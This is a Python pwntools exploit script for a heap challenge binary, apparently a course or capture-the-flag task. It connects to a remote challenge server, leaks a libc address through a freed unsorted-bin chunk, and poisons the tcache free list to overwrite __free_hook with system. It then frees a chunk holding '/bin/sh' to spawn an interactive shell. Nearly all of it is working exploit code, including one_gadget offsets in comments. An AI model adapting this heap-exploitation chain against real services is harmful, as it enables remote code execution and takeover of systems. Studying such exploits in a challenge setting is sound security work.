import os
import string
import struct
from itertools import chain
from typing import Any, Callable, Iterable, List

from pwn import *
from pwnlib.gdb import Gdb

binary = './chal'
context.binary = binary
context.terminal = ['tmux', 'splitw', '-h']
# context.arch = "amd64"
# context.log_level = 'debug'

def flatten(items: Iterable) -> List[Any]:
    return list(chain.from_iterable(items))

def make_breakpoints(breakpoints: List[str]) -> List[str]:
    return list(map(lambda b: f'b* {b}', breakpoints))

def make_commands(args: List[str]) -> List[str]:
    return flatten(map(lambda a: [a], args))

breakpoints = [
    '0x55555555560f', # main RET
    # '0x5555555553c2', # add RET
    # '0x555555555453', # delete RET
    # '0x555555555509', # edit RET 
    '0x5555555552b1', # menu RET 
]
print_statements = []
breakpoints = make_breakpoints(breakpoints)
commands = make_commands(breakpoints + print_statements)


# LIBC
# libc = ELF('/nix/store/c35hf8g5b9vksadym9dbjrd6p2y11m8h-glibc-2.35-224/lib/libc.so.6')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
bin_sh_offset = next(libc.search(b'/bin/sh\x00'))
system_offset = libc.symbols[b'system']
free_hook_offset = libc.symbols[b'__free_hook']

gdbscript = '''
continue
continue
''' + '\n'.join(commands)

# with gdb.debug(binary, aslr=False, api=True, gdbscript=gdbscript) as p:
#     p: process
#     p.gdb: Gdb

# with process(binary, aslr=False) as p:
with remote('128.238.62.254', 12347) as p:


    is_remote = isinstance(p, remote)
    is_debuggable = not is_remote

    def send_cmd(cmd):
        if type(cmd) == str:
            cmd = cmd.encode()
        elif type(cmd) == int:
            cmd = str(cmd).encode()

        p.sendlineafter(b'>', cmd)

    def add(size: int):
        send_cmd(1)
        p.sendlineafter(b'Size:\n', str(size).encode())

    def delete(idx: int):
        send_cmd(2)
        send_cmd(idx)

    def edit(idx: int, cmd: bytes):
        send_cmd(3)
        send_cmd(idx)
        p.sendlineafter(b'Content:\n', cmd)

    def show(idx: int) -> bytes:
        send_cmd(4)
        send_cmd(idx)
        p.recvuntil(b'Content:\n').decode()
        data = p.recvuntil(b'===').rstrip(b'===')
        log.info("Heap at idx %d: %s", idx, data)
        return data

    def exit():
        send_cmd(5)

    def wait():
        if is_debuggable:
            p.gdb.wait()

    if is_remote:
        p.recvuntil(b'Please input your NetID (something like abc123): ')
        p.sendline(b'nf2137')

    '''
    x/50xg 0x555555559290
    x/32xg &array
    '''

    SIZE = 0x20
    UNSORTED_BIN_SIZE = 0x418

    '''
    Leak LIBC
    '''
    add(UNSORTED_BIN_SIZE)
    add(SIZE)
    delete(0)

    arena_offset = 0x1ecbe0
    main_arena = u64(show(0)[:8])
    libc_base: int = main_arena - arena_offset
    # log.info(f'free_hook_offset: {hex(free_hook_offset)}')
    # log.info(f'system_offset: {hex(system_offset)}')
    # log.info(f'bin_sh_offset: {hex(bin_sh_offset)}')
    log.info(f'Main Arena: {hex(main_arena)}')
    log.info(f'LIBC base: {hex(libc_base)}')

    free_hook: int = libc_base + free_hook_offset
    system: int = libc_base + system_offset
    bin_sh: int = libc_base + bin_sh_offset
    '''
    one_gadget /lib/x86_64-linux-gnu/libc.so.6

    0xe3afe execve("/bin/sh", r15, r12)
    constraints:
    [r15] == NULL || r15 == NULL
    [r12] == NULL || r12 == NULL

    0xe3b01 execve("/bin/sh", r15, rdx)
    constraints:
    [r15] == NULL || r15 == NULL
    [rdx] == NULL || rdx == NULL

    0xe3b04 execve("/bin/sh", rsi, rdx)
    constraints:
    [rsi] == NULL || rsi == NULL
    [rdx] == NULL || rdx == NULL
    '''
    gadget: int = libc_base + 0xe3b04

    log.info(f'free_hook: {hex(free_hook)}')
    log.info(f'system: {hex(system)}')
    log.info(f'bin_sh: {hex(bin_sh)}')
    log.info(f'gadget: {hex(gadget)}')

    delete(1) # Clean up

    '''
    Overwrite __free_hook --> system
    '''
    add(SIZE)
    add(SIZE)

    delete(1)
    delete(0)
    # Edit FD on tcachebin to point __free_hook address
    edit(0, p64(free_hook))


    add(SIZE) # Pop off tcachebin
    add(SIZE) # Pop off tcachebin -- this is the __free_hook address

    # Now edit the __free_hook to point to `system`
    edit(5, p64(system))

    edit(1, b'/bin/sh\0')

    delete(1) # Since we have the hook overwritten now, we can `free` an address to trigger the shell
    p.interactive()
